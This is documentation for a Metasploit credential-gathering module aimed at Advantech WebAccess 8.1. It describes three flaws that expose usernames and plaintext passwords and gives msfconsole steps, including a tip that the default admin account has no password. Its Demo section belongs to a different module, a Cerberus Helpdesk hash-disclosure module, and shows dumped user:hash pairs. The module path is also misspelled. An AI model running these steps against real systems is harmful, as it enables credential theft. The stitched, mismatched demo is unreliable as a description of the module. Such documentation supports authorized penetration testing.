## Description

This module exploits three vulnerabilities in Advantech WebAccess.

The first vulnerability is the ability for an arbitrary user to access the admin user list page,
revealing the username of every user on the system.

The second vulnerability is the user edit page can be accessed loaded by an arbitrary user, with
the data of an arbitrary user.

The final vulnerability exploited is that the HTML Form on the user edit page contains the user's
plain text password in the masked password input box. Typically the system should replace the
actual password with a masked character such as "*".


## Vulnerable Application

Version 8.1 was tested during development:

http://advcloudfiles.advantech.com/web/Download/webaccess/8.1/AdvantechWebAccessUSANode8.1_20151230.exe

8.2 is not vulnerable to this.

## Verification Steps

1. Start msfconsole
2. ```use auxiliary/gahter/advantech_webaccess_creds```
3. ```set WEBACCESSUSER [USER]```
4. ```set WEBACCESSPASS [PASS]```
5. ```run```

## Options

**WEBACCESSUSER**

The username to use to log into Advantech WebAccess. By default, there is a built-in account
```admin``` that you could use.

**WEBACCESSPASS**

The password to use to log into AdvanTech WebAccess. By default, the built-in account ```admin```
does not have a password, which could be something you can use.


## Demo

msf > use auxiliary/gather/cerberus_helpdesk_hash_disclosure
msf auxiliary(cerberus_helpdesk_hash_disclosure) > show options

Module options (auxiliary/gather/cerberus_helpdesk_hash_disclosure):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads
   URI      /                no        URL of the Cerberus Helpdesk root
   VHOST                     no        HTTP server virtual host

msf auxiliary(cerberus_helpdesk_hash_disclosure) > set rhosts 10.90.5.81
rhosts => 10.90.5.81
msf auxiliary(cerberus_helpdesk_hash_disclosure) > run

[-] Invalid response received for /storage/tmp/devblocks_cache---ch_workers
[+] admin:aaa34a6111abf0bd1b1c4d7cd7ebb37b
[+] example:112302c209fe8d73f502c132a3da2b1c
[+] foobar:0d108d09e5bbe40aade3de5c81e9e9c7
